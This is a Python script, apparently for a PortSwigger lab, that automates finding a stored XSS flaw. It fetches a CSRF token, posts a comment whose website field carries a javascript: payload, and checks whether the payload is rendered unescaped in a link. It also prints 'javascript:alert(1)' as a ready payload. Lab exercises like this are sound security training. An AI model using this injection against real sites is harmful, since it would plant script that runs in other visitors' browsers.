import requests
from bs4 import BeautifulSoup

def verify_href_stored_xss(base_url, post_path):
    # 1. 使用 Session 保持状态
    session = requests.Session()
    post_url = base_url + post_path
    comment_url = base_url + "/post/comment"
    
    # 2. 构造探针 Payload
    # 我们使用 javascript: 伪协议，注入一个特征函数，而不是真实的 alert
    xss_probe = "javascript:xss_probe_8848()"
    
    print(f"[*] 步骤 1: 访问博客页面获取 CSRF Token: {post_url}")
    try:
        res = session.get(post_url, timeout=10)
        soup = BeautifulSoup(res.text, 'html.parser')
        
        # 提取评论表单中的 CSRF token (PortSwigger Lab 的标准结构)
        csrf_input = soup.find('input', {'name': 'csrf'})
        if not csrf_input:
            print("[-] 未找到 CSRF Token，脚本可能不适配此页面结构。")
            return
        csrf_token = csrf_input['value']
        print(f"    [+] 成功获取 CSRF Token: {csrf_token}")
        
    except Exception as e:
        print(f"[-] 获取页面失败: {e}")
        return

    # 3. 步骤 2: 提交包含恶意 Payload 的评论 (Inject)
    print(f"[*] 步骤 2: 提交包含 Payload 的评论...")
    # 假设注入点在 'website' 字段，这会渲染成 <a href="[website]">name</a>
    comment_data = {
        'csrf': csrf_token,
        'postId': '1', # 假设我们在第一篇博客下评论
        'comment': '这是一条用于 XSS 探测的自动化测试评论。',
        'name': 'XssTester',
        'email': 'tester@example.com',
        'website': xss_probe  # 注入点！
    }
    
    try:
        post_res = session.post(comment_url, data=comment_data, timeout=10)
        if post_res.status_code != 200:
            print("[-] 评论提交可能失败。")
    except Exception as e:
        print(f"[-] 提交评论请求失败: {e}")
        return

    # 4. 步骤 3: 重新访问页面并验证 DOM (Verify)
    print(f"[*] 步骤 3: 重新加载页面，验证 Payload 是否成功渲染...")
    try:
        verify_res = session.get(post_url, timeout=10)
        verify_soup = BeautifulSoup(verify_res.text, 'html.parser')
        
        # 寻找我们刚刚留下的足迹
        # 我们查找所有 href 属性等于我们 Payload 的 <a> 标签
        vuln_links = verify_soup.find_all('a', href=xss_probe)
        
        print("-" * 40)
        if vuln_links:
            print("[+] 漏洞确诊！成功在 href 属性中注入 javascript: 伪协议。")
            for link in vuln_links:
                print(f"    受影响的 DOM 节点: {link}")
            
            print("\n[*] 建议的实战 Payload (用于触发弹窗):")
            print("    javascript:alert(1)")
        else:
            print("[-] 未发现漏洞。")
            print("    可能原因: 服务器强制在 href 前面添加了 'http://'，或者过滤了 'javascript:' 关键字。")
        print("-" * 40)
        
    except Exception as e:
        print(f"[-] 验证请求失败: {e}")

if __name__ == "__main__":
    # 替换为你的 PortSwigger Lab URL
    LAB_URL = "https://YOUR-LAB-ID.web-security-academy.net"
    # 通常是 /post?postId=1 这样的路径
    POST_PATH = "/post?postId=1" 
    
    verify_href_stored_xss(LAB_URL, POST_PATH)
